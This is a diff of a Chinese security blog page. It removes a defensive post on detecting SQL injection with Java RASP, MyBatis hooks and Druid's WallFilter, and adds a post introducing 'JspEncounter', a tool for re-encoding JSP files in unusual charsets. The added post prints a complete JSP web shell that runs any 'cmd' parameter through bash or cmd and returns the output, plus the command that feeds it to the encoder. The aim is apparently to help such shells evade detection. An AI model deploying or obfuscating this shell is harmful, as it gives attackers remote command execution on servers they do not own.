@@ -152,307 +152,67 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-JAVA-RASP高效检测SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-JSP下的白魔法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/">JAVA-RASP高效检测SQL注入</a>
+      <a class="article-title" href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/">JSP下的白魔法</a>
     </h1>
   
 
         
-        <a href="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2022-09-21T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-09-20</time>
+        <a href="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/" class="archive-article-date">
+  	<time datetime="2022-11-29T08:41:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-11-29</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="JAVA-RASP高效检测SQL注入"><a href="#JAVA-RASP高效检测SQL注入" class="headerlink" title="JAVA-RASP高效检测SQL注入"></a>JAVA-RASP高效检测SQL注入</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>笔者在八月份时编写了一系列RASP Hook点及处理方式，这个过程中需要笔者去debug各lib库的代码流程，也协助笔者去做更多的思考。关于这些SQL注入检测方式的检测方案，本文做此分享。</p>
-<p>本文首先说说单纯针对MyBatis框架的一种SQL注入检测方案，但这种方案除了局限性外，对复杂SQL业务（动态插入SQL语句片段）会误报；之后讲一下引入Druid SQL语法引擎，而引入的语法引擎我们有两种技术路线，一种是只使用其基础的词法分析引擎，将SQL参数化，去除SQL语句中的数据，然后上报云端检测，另外一种则是 再引入 其<a href="https://github.com/alibaba/druid/wiki/简介_WallFilter" target="_blank" rel="noopener">WallVisitor</a>语法引擎，对SQL中不符合预期的语法行为进行告警拦截。</p>
-<h2 id="2-MyBatis-SQL注入检测"><a href="#2-MyBatis-SQL注入检测" class="headerlink" title="2. MyBatis SQL注入检测"></a>2. MyBatis SQL注入检测</h2><p>起初想法中，该方案十分高效，且RASP设计方案中，云端拥有规则引擎，可以处理方案中的误报问题，但最终考虑到局限性，最后还是放弃该方案，本节仅作一个有趣的设想的分享。</p>
-<h3 id="2-1-思路整理"><a href="#2-1-思路整理" class="headerlink" title="2.1 思路整理"></a>2.1 思路整理</h3><p>有如下UserMapper.xml</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/UserMapper.png" alt="UserMapper"></p>
-<p>在SQL执行过程中，其会被解析成一个树状的 rootSqlNode (图片最下面) , Mybatis会遍历rootSqlNode下的node节点，将其拼接成一个完整的sql语句，而这些node节点中只有StaticTextSqlNode、TextSqlNode保存SQL片段，StaticTextSqlNode单纯保存SQL片段，TextSqlNode会调用dollar token替换函数来处理SQL片段中的 ${…} 数据。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/DynamicSqlSource_getBoundSql.png" alt="DynamicSqlSource#getBoundSql"></p>
-<p>我们通过插桩StaticTextSqlNode、TextSqlNode，拼接其中的原始SQL片段可以获得本次SQL执行的raw sql：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="comment">#&#123;username&#125; order by $&#123;order&#125;</span></span><br></pre></td></tr></table></figure>
+        <h1 id="JSP下的白魔法：JspEncounter"><a href="#JSP下的白魔法：JspEncounter" class="headerlink" title="JSP下的白魔法：JspEncounter"></a>JSP下的白魔法：JspEncounter</h1><p>@turn1tup</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        这几天看到以前整活的一些有趣的JSP编码手法被补天的分享会提及到，想到有大佬与前些年的笔者一样，发现了这个手法，然后也一样不吝啬分享出来，不免与有荣焉。</p>
+<p>​        竟然如此，笔者索性抽出咸鱼时间编写了一个小工具，帮助广大同学们学习该手法，而对应的原理实在枯燥乏味，就算笔者了然，但这最好还是给有心之人可自行查看吧，本文爽就完事了。</p>
+<p>​        接下来直接阐述工具相应的矩阵手法及使用效果，而工具使用的注意项及等信息则请在github查看 ：</p>
+<p>​        <a href="https://github.com/turn1tup/JspEncounter" target="_blank" rel="noopener">https://github.com/turn1tup/JspEncounter</a></p>
+<h2 id="矩阵手法"><a href="#矩阵手法" class="headerlink" title="矩阵手法"></a>矩阵手法</h2><p>被工具转换前的原始source.jsp文件内容为：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> contentType=<span class="string">"text/html"</span> %&gt;</span><br><span class="line">&lt;%! <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;&#125; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.getParameter (<span class="string">"cmd"</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> isWin = System.getProperty(<span class="string">"os.name"</span>).toUpperCase().contains(<span class="string">"WIN"</span>);</span><br><span class="line">        String[] cmd = &#123;isWin?<span class="string">"cmd"</span>:<span class="string">"/bin/bash"</span>,isWin?<span class="string">"/c"</span>:<span class="string">"-c"</span>,request.getParameter(<span class="string">"cmd"</span>)&#125;;</span><br><span class="line">        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">        OutputStream outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        outputStream.write(String.valueOf(System.currentTimeMillis()).getBytes());</span><br><span class="line">        <span class="keyword">while</span>((a=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            outputStream.write(a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
-<p>另外，其后，我们可以获取到处理dollar token后的SQL语句parsed sql：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user,host from user where user&#x3D;#&#123;user&#125;   order by 1</span><br></pre></td></tr></table></figure>
+<p>工具命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java  &quot;-Dfile.encoding&#x3D;utf-8&quot; -jar JspEncounter.jar -m jsp -c matrix.xlsx -s source.jsp -o result.jsp</span><br></pre></td></tr></table></figure>
 
-<p>于是，我们可以有这么一个构想：获取mybatis sql执行过程中的 raw sql 与 parsed sql，判断出${}处替换后的地方sql结构有没有变化，如果sql结构发生变化则认为该sql为需要关注的，且该raw sql 单位时间内未上报过，则上报云端处理（但如果业务复杂，${}拼接的就是多个SQL词，则会误报，如开源的若依后台系统）。</p>
-<h3 id="2-2-流程逻辑与插桩"><a href="#2-2-流程逻辑与插桩" class="headerlink" title="2.2 流程逻辑与插桩"></a>2.2 流程逻辑与插桩</h3><p>SqlSource有多种，而我们只需要关注DynamicSqlSource，且主要逻辑点在 <code>DynamicSqlSource#getBoundSql</code>。</p>
-<p>末尾的<code>context.getSql()</code>函数拿到的是 dollar token (${}) 被替换处理后的parsed sql语句，而我们想拿到raw sql语句则需要我们自己跟踪 SqlNode的 sql 拼接过程，在<code>StaticTextSqlNode#apply</code>、<code>TextSqlNode#apply</code>方法前插桩，获取text（sql片段），然后手动拼接。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/flow.png" alt="flow"></p>
-<p>Hook点如下，其中<code>StaticTextSqlNode#apply</code>、<code>TextSqlNode#apply</code>方法的前后都使用同一函数逻辑处理。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/classyaml.png" alt="classyaml"></p>
-<h3 id="2-3-Hook点处理"><a href="#2-3-Hook点处理" class="headerlink" title="2.3 Hook点处理"></a>2.3 Hook点处理</h3><p>在整个逻辑流程前，先初始化StringJoiner或StringBuilder，用于raw sql的拼接，在整个逻辑流程处理完成后，需要将对应的数据remove清空。在整个逻辑流程处理完成后，对获取到的 rawSql 与 parsedSql 进行sql结构检测。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/MybatisDynamicSqlSource.png" alt="MybatisDynamicSqlSource"></p>
-<p>在<code>StaticTextSqlNode#apply</code>、<code>TextSqlNode#apply</code>方法前调用前，获取 this.text ，然后拼接进来即可。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/MybatisTextSqlNode.png" alt="MybatisTextSqlNode"></p>
-<p>通过插桩context.getSql，获取 parsedSql</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/MybatisDynamicContext.png" alt="MybatisDynamicContext"></p>
-<h3 id="2-4-SQL结构检测（思路）"><a href="#2-4-SQL结构检测（思路）" class="headerlink" title="2.4 SQL结构检测（思路）"></a>2.4 SQL结构检测（思路）</h3><p>dollar token之间，dollar token与末尾之间，可以称为缝隙 gap ，通过 raw sql 我们可以获取这些 gap 的长度，gap长度将用于协助判断parsed sql结构是否发生变化。</p>
-<p> parsed sql 这块的解析，针对替换后的dollar token，需要考虑其是否在引号包裹内，如果是，则需要考虑忽略被转义的引号，笔者认为的合法字符集为<code>(Character.isDigit(c)|| Character.isLetter(c) || c==&#39;_&#39; || c==&#39;$&#39;|| c==&#39;-&#39;|| c&gt;=&#39;\u0080&#39;)</code>。</p>
-<p>如果raw sql 与 parsed sql的 gap 数量或内容不一致，则认为SQL发生变化。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/checkSql.png" alt="checkSql"></p>
-<p>demo展示，运行结果显示第 1 组、第 4 组未发生SQL结构变化：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/demo.png" alt="demo"></p>
-<h3 id="2-5-SQL结构检测（代码）"><a href="#2-5-SQL结构检测（代码）" class="headerlink" title="2.5 SQL结构检测（代码）"></a>2.5 SQL结构检测（代码）</h3><pre><code>private class PosItem{
-    public int start;
-    public int end;
-    public int leftQuotePos;
-    public int rightQuotePos;
-    public char quote =&apos;\u0000&apos;;
 
-    public PosItem(int start, int end ){
-        this.start = start;
-        this.end = end;
-    }
 
-    public PosItem(int start, int end, int leftQuotePos, int rightQuotePos, char quote) {
-        this.start = start;
-        this.end = end;
-        this.leftQuotePos = leftQuotePos;
-        this.rightQuotePos = rightQuotePos;
-        this.quote = quote;
-    }
-}
-
-String openToken = &quot;${&quot;;
-String closeToken = &quot;}&quot;;
-
-/**
- *
- * @param raw 动态SQL中，拼接后的SQL
- * @param parsed mybatis插入变量后的SQL，不带有${}
- * @return 如果结构发生变化，则返回raw sql中变化位置的 startPos,endPos
- */
-private ImmutablePair&lt;Integer, Integer&gt; checkSql(String raw, String parsed) {
-    if (raw == null || raw.isEmpty() || parsed==null || parsed.isEmpty()) {
-        return null;
-    }
-    // 当前 ${的起始点
-    int start = raw.indexOf(openToken);
-    if (start == -1) {
-        return null;
-    }
-    char[] rawCs = raw.toCharArray();
-    char[] parsedCs = parsed.toCharArray();
-
-    List&lt;PosItem&gt; rawPosItems = new ArrayList&lt;&gt;();
-
-    while (start &gt; -1) {
-
-        if (start &gt; 0 &amp;&amp; rawCs[start - 1] == &apos;\\&apos;) {
-            // this open token is escaped. remove the backslash and continue.
-            start = start + openToken.length();
-        }else{
-            // found open token. let&apos;s search close token.
-            int tmpPos = start + openToken.length();
-
-            int end = raw.indexOf(closeToken, tmpPos);
-            boolean matchEnd = false;
-            while (end &gt; -1) {
-                if (end &gt; tmpPos &amp;&amp; rawCs[end - 1] == &apos;\\&apos;) {
-                    end += closeToken.length();
-                    end = raw.indexOf(closeToken, end);
-                }else{
-                    //
-                    end += closeToken.length();
-                    matchEnd = true;
-                    break;
-                }
-            }
-
-            char leftQuote = 0;
-            int leftQuotePos=0;
-            int rightQuotePos=0;
-            // 查看 ${前面有没有闭合符号
-            for (int i = start-1; i &gt; 0; i--) {
-                // 先忽略 空白字符，这一步可能没有必要？
-                if (rawCs[i] == &apos;\u0020&apos;
-                        ||rawCs[i] == &apos;\u0009&apos;
-                ) {
-                    //continue;
-                }else if (rawCs[i] == &apos;&quot;&apos; || rawCs[i] == &apos;\&apos;&apos;) {
-                    leftQuote = rawCs[i];
-                    leftQuotePos = i;
-                    break;
-                }else{
-                    // 匹配到其他字符则认为没有闭合符号
-                    break;
-                }
-            }
-
-            char rightQuote= 0;
-            if (leftQuote != 0) {
-                for (int i = end; i &lt; rawCs.length; i++) {
-                    // 先忽略 空白字符，这一步可能没有必要？
-                    if (rawCs[i] == &apos;\u0020&apos;
-                            ||rawCs[i] == &apos;\u0009&apos;
-                    ) {
-                        //continue;
-                    }else if (rawCs[i] == leftQuote) {
-                        rightQuote = leftQuote;
-                        rightQuotePos=i;
-                        break;
-                    }else{
-                        // 匹配到其他字符则认为没有闭合符号
-                        break;
-                    }
-                }
-                // SQL语句原本就有错误的，后面没有引号，不做处理
-                if (rightQuotePos == 0) {
-                    return null;
-                }
-            }
-
-            if (matchEnd ) {
-                rawPosItems.add(new PosItem(start, end,leftQuotePos,rightQuotePos,rightQuote));
-            }
-            start = raw.indexOf(openToken, end);
-
-        }
-    }
-    // 没有${
-    if (rawPosItems.size() == 0) {
-        return null;
-    }
-    int currPos = rawPosItems.get(0).start;
-
-    int indexItem = 0 ;
-    PosItem itemRef = rawPosItems.get(indexItem);
-
-    int countGapMatch = 0;
-    while (currPos &lt; parsedCs.length) {
-        itemRef = rawPosItems.get(indexItem);
-        char c = parsedCs[currPos];
-        int startGap;
-        int add = 0;
-        // 是否结构发生变化
-        boolean wordEnd = false;
-        if (itemRef.quote!= 0 ) {
-            if (c == itemRef.quote) {
-                wordEnd = true;
-            } else if (c == &apos;\\&apos;) {
-                add = 2;
-            } else {
-                add = 1;
-            }
-        }else if (Character.isDigit(c)|| Character.isLetter(c)
-                || c==&apos;_&apos; || c==&apos;$&apos;|| c==&apos;-&apos;
-                || c&gt;=&apos;\u0080&apos;) {
-            add = 1;
-        }else{
-            wordEnd = true;
-        }
-
-        if (wordEnd || currPos == parsedCs.length-1) {
-            int rawEndGap = raw.length();
-            int rawEndGapElse = raw.length();
-            if (indexItem+1&lt;rawPosItems.size()) {
-                PosItem itemNext = rawPosItems.get(indexItem + 1);
-                rawEndGap = itemNext.quote == 0? itemNext.start : itemNext.leftQuotePos;
-                rawEndGapElse = itemNext.start;
-                indexItem += 1;
-
-            }
-            int rawStartGap = itemRef.quote == 0 ? itemRef.end : itemRef.rightQuotePos;
-            String rawGap =raw.substring(rawStartGap , rawEndGap);
-            int rawGapLen = rawEndGap - rawStartGap;
-            //遇到len 0的情况，这里为
-            add = rawEndGapElse - rawStartGap;
-            if (currPos + rawGapLen &lt;= parsedCs.length) {
-
-                String parsedGap = parsed.substring(currPos, currPos + rawGapLen);
-                if (parsedGap.equals(rawGap)) {
-                    countGapMatch += 1;
-                }else{
-                    return new ImmutablePair&lt;&gt;(itemRef.start,itemRef.end);
-                }
-            }else{
-                return new ImmutablePair&lt;&gt;(itemRef.start,itemRef.end);
-            }
-        }
-        if (add == 0) {
-            add = 1;
-        }
-        currPos += add;
-    }
-    if (rawPosItems.size() != countGapMatch) {
-        return new ImmutablePair&lt;&gt;(itemRef.start,itemRef.end);
-    }
-    return null;
-}</code></pre><h2 id="3-Druid-SQL语法引擎"><a href="#3-Druid-SQL语法引擎" class="headerlink" title="3. Druid SQL语法引擎"></a>3. Druid SQL语法引擎</h2><p>3.1、3.2小节稍微讲讲笔者移植的druid sql语法引擎，之后讲一下SQL注入的检测方案。</p>
-<h3 id="3-1-性能与兼容"><a href="#3-1-性能与兼容" class="headerlink" title="3.1 性能与兼容"></a>3.1 性能与兼容</h3><p>基础的SQL Parser，包括SQL参数化（去除数据），兼容广泛的数据库，且速度十分快；进阶功能为WallFilter则需要耗费更多处理时间，兼容的数据库少很多，但也很不错。</p>
-<p>性能方面，如果单纯使用SQL Parser，对SQL语句进行参数化，处理时间约为600ns，使用WallFilter，处理时间约为50us，</p>
-<blockquote>
-<p><a href="https://github.com/alibaba/druid/wiki/SQL-Parser" target="_blank" rel="noopener">https://github.com/alibaba/druid/wiki/SQL-Parser</a></p>
-<p>Druid的SQL Parser是手工编写，性能非常好，目标就是在生产环境运行时使用的SQL Parser，性能比antlr、javacc之类工具生成的Parser快10倍甚至100倍以上。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;SELECT ID, NAME, AGE FROM USER WHERE ID &#x3D; ?</span><br></pre></td></tr></table></figure>
-
-<p>这样的SQL，druid parser处理大约是600纳秒，也就是说单线程每秒可以处理1500万次以上。在1.1.3~1.1.4版本中，SQL Parser的性能有极大提升，完全可以适用于生产环境中对SQL进行处理。</p>
-</blockquote>
-<blockquote>
-<p><a href="https://github.com/alibaba/druid/wiki/%E7%AE%80%E4%BB%8B_WallFilter" target="_blank" rel="noopener">https://github.com/alibaba/druid/wiki/%E7%AE%80%E4%BB%8B_WallFilter</a></p>
-<p>WallFilter在运行之后，会使用LRU Cache算法维护一个白名单列表，白名单最多1000个SQL。正常的SQL在白名单中，每次检测只需要一次加锁和一次hash查找，预计在50 nano以内。在白名单之外的SQL检测，预计在50微秒以内。</p>
-</blockquote>
-<p>数据库兼容方面，druid sql-parser 支持众多的数据库，缺省支持sql-92标准的语法。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-sql-parser-dbtype.png" alt="druid-sql-parser-dbtype"></p>
-<p>WallFilter目前则支持主流数据库。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-wallprovider.png" alt="druid-wallprovider"></p>
-<h3 id="3-2-WallFilter"><a href="#3-2-WallFilter" class="headerlink" title="3.2 WallFilter"></a>3.2 WallFilter</h3><p>用户开启druid的wall功能后，将启动WallFilter进行SQL注入的检测。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  datasource:</span><br><span class="line">    name: mysql</span><br><span class="line">    type: com.alibaba.druid.pool.DruidDataSource</span><br><span class="line">    druid:</span><br><span class="line">      filters: stat,wall</span><br><span class="line">      ... ...</span><br></pre></td></tr></table></figure>
-
-<p>官方文档给出了Druid WallFilter的配置项</p>
-<p><a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter" target="_blank" rel="noopener">https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter</a></p>
-<h4 id="3-2-1-SQL黑白名单"><a href="#3-2-1-SQL黑白名单" class="headerlink" title="3.2.1 SQL黑白名单"></a>3.2.1 SQL黑白名单</h4><p>WallFilter首先会判断当前的sql语句，是否在黑名单、白名单内，如果在黑名单内则直接拦截，如在白名单内则直接放行，这一步骤可大量减少正常业务的SQL语句经过WallVisitor，提升了性能。</p>
-<p>判断黑名单的方法getBlackSql只是将整条SQL语句取哈希后查看是否在blackList LRUCache 中；getWhiteSql则还会将SQL语句参数化，之后查看是否在 whiteList LRUCache 中，LRUCache默认最大数量1000，空间不足时覆盖旧的数据。</p>
-<p>通过 ParameterizedOutputVisitorUtils.parameterize 方法将SQL进行参数化：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-getWhiteSql.png" alt="druid-getWhiteSql"></p>
-<p>参数化前SQL语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where user&#x3D;&#39;root&#39; and 1&#x3D;1 order by 1</span><br></pre></td></tr></table></figure>
-
-<p>参数化后的SQL语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM user</span><br><span class="line">WHERE user &#x3D; ?</span><br><span class="line">	AND 1 &#x3D; 1</span><br><span class="line">ORDER BY 1</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-2-2-语法防火墙"><a href="#3-2-2-语法防火墙" class="headerlink" title="3.2.2 语法防火墙"></a>3.2.2 语法防火墙</h4><p>com.alibaba.druid.wall.WallProvider#checkInternal ：该方法下的这段代码就是 WallFilter 的核心功能，先根据配置情况拦截 带有注释的SQL语句、堆叠查询的SQL语句，随后创建 WallVisitor，而 WallVisitor 拥有多种检查项，包括禁止变量访问或是变量黑名单、禁止永真语句、禁止黑名单函数、禁止访问黑名单表（数据库系统表）等，其中一些复杂的情况则被设置成配置选项，如禁止写文件。检测不通过则SQL语句会被加入黑名单，检测通过则SQL语句与参数化后的SQL语句都会被加入黑名单。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-walfilter-core.png" alt></p>
-<p>我们可以配置语法防火墙中的 函数、表、变量 黑名单：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-resource-wall.png" alt="druid-resource-wall"></p>
-<p>配置选项则可参考 <a href="https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter" target="_blank" rel="noopener">https://github.com/alibaba/druid/wiki/%E9%85%8D%E7%BD%AE-wallfilter</a> ，或是com.alibaba.druid.wall.WallConfig</p>
-<h3 id="3-3-上报参数化SQL"><a href="#3-3-上报参数化SQL" class="headerlink" title="3.3 上报参数化SQL"></a>3.3 上报参数化SQL</h3><p>本节的 SQL参数化方案 兼容更多数据库，RASP端性能也会更好，缺点是占用网络资源，然后不好做本地拦截，容易误报。</p>
-<p>起初想的是RASP端不必做太多检测工作，移植Druid参数化语法引擎过来，然后在云端写规则做SQL检测即可。但后面RASP端功能越来完善，就想把顺便把SQL注入检测这块做得更好，把WallVisitor移植进来，所以本节得方案目前可能暂时不会使用，转而使用WallVisitor进行告警拦截，然后上报。</p>
-<p>整个代码的实现逻辑很简单，获取参数化后的SQL语句，然后判断该merged sql是否在单位时间内出现过，如果出现过则不上报云端：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/center-checker.png" alt="center-checker"></p>
-<h3 id="3-4-WallVisitor拦截SQL注入"><a href="#3-4-WallVisitor拦截SQL注入" class="headerlink" title="3.4 WallVisitor拦截SQL注入"></a>3.4 WallVisitor拦截SQL注入</h3><p>由于Druid依赖库过多，且为了方便管理，笔者对其  SQL参数化 与 WallVisitor 模块进行了代码移植。</p>
-<p>这里将druid相关代码、resource文件移植过来并重命名顶层包名，其中的 druid.wall 包含了本节 语法防火墙的重点代码 ，通过这样的移植，我们没有引入其他任何三方依赖库。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/druid-package.png" alt="druid-package"></p>
-<p>防护的代码如下：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/checkWall.png" alt="checkWall"></p>
-<p>sql wall的配置这块，不同数据库的sql wall对象需要单独维护一个 wall config：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/getProvider.png" alt="getProvider"></p>
-<p>wall conifg包含了通用的开关配置与差异化的配置 (deny-function.txt deny-schema.txt deny-variant.txt permit-funtion permit-variant等)，且差异化的配置这块的数据类型还比较复杂，所以目前仅将这些通用配置云端化，后续再将差异化配置这块补全。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/wallconfig.png" alt="wallconfig"></p>
-<p>上报到云端的攻击信息：</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/kafka_attack_info.png" alt="kafka_attack_info"></p>
-<p>当然，通过WallVisitor进行拦截，我们就不可避免地引出一个问题：我们难以做到完全不漏过SQL注入攻击的同时不产生误报。如，业务的语句中存在注释符号，如果我开启注释拦截，则可能会误报，而不开启则会漏过一些语句。另外，仔细测试WallVisitor，我们还是可以发现某些可利用的函数它没有拦截，但即使出现漏洞，仅靠这些 “漏掉” 的函数，我们也很难进行漏洞利用 （或许这样的SQL注入拦截也足够了？）。</p>
-<h2 id="4-加速SQL注入检测"><a href="#4-加速SQL注入检测" class="headerlink" title="4. 加速SQL注入检测"></a>4. 加速SQL注入检测</h2><p>第二节的mybatis方案被废弃了，但我们可以二次利用，加速mybatis框架下的SQL注入检测，其他ORM框架应该也可利用该思路。</p>
-<p>下图是我们的Hook点</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/hook-mybatis.png" alt="hook-mybatis"></p>
-<p>含有 ${..} 的SQL片段只会保存在TextSqlNode中， 我们继续hook TextSqlNode，如果触发了该hook点，则认为本次sql不可忽略</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/TextSqlNodeHook.png" alt="TextSqlNodeHook"></p>
-<p>另外我们Hook MappedStatement，在整个mybatis mapping流程开始时，先假设本次sql是可忽略的</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/MappedStatementHook.png" alt="MappedStatementHook"></p>
-<p>最后，我们在做SQL注入检测时，判断 CanIgnoreSql 是否为 true ，为 true 则不需要对本次SQL执行进行SQL注入检测，以此加快了我们RASP的SQL注入检测。</p>
-<p><img src="/2022/09/20/JAVA-RASP%E9%AB%98%E6%95%88%E6%A3%80%E6%B5%8BSQL%E6%B3%A8%E5%85%A5/CanIgnoreSql.png" alt="CanIgnoreSql"></p>
-<h2 id="5-结语"><a href="#5-结语" class="headerlink" title="5.结语"></a>5.结语</h2><p>在RASP防护中，通过了解相关框架的一些流程，我们即可优化我们的检测思路；通过参考引用优秀的开源项目，也能帮助我们站得更高。</p>
+<h3 id="magic-charset"><a href="#magic-charset" class="headerlink" title="magic charset"></a>magic charset</h3><p>我们打开 <code>matrix.xlsx</code>进行配置，这里配置输出单种字符集文件：</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset.png" alt="all_cp037"></p>
+<p>执行命令后，输出的编码后的文件:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/magic_charset_demo.png" alt="magic_charset_demo"></p>
+<h3 id="declare-charset"><a href="#declare-charset" class="headerlink" title="declare charset"></a>declare charset</h3><p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset.png" alt="declare_charset"></p>
+<p>demo（放前后都可）:</p>
+<p><img src="/2022/11/29/JSP%E4%B8%8B%E7%9A%84%E7%99%BD%E9%AD%94%E6%B3%95/declare_charset_demo.png" alt="declare_charset_demo"></p>
